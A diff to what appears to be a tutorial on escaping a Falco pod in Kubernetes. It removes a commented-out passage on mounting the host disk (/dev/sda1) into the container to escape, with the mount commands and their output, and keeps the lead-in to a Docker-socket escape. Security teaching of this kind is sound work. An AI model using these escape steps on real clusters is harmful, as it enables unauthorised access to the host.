@@ -94,41 +94,6 @@ Let's get into the Falco pod and take a look around.
 kubectl exec -it -n falco falco-mbk2n -- /bin/bash
 ```
 
-<!--
-One of the easiest container escape methods mounts the host disk into the container and performs a `chroot`. Let's see if we have access to the disk.
-
-```sh
-mount | grep /dev
-```
-```
-tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
-devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
-mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
-/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime)
-/dev/sda1 on /etc/falco type ext4 (rw,relatime)
-/dev/sda1 on /root/.falco type ext4 (rw,relatime)
-/dev/sda1 on /dev/termination-log type ext4 (rw,relatime)
-shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
-/dev/sda1 on /etc/hosts type ext4 (rw,relatime)
-/dev/sda1 on /etc/hostname type ext4 (rw,relatime)
-/dev/sda1 on /etc/falco/falco.yaml type ext4 (ro,relatime)
-/dev/sda1 on /usr/share/falco/plugins type ext4 (rw,relatime)
-```
-
-Looks like `/dev/sda1` is available; let's mount it:
-
-```sh
-mkdir /tmp/host
-mount /dev/sda1 /tmp/host
-```
-
-Listing the directory reveals it does not have the full system on it, however. Let's unmount the disk:
-
-```sh
-umount /tmp/host
-```
--->
-
 One method for container escape uses the host's docker socket to start a new vulnerable container. Let's check if there is a Docker socket available:
 
 ```sh
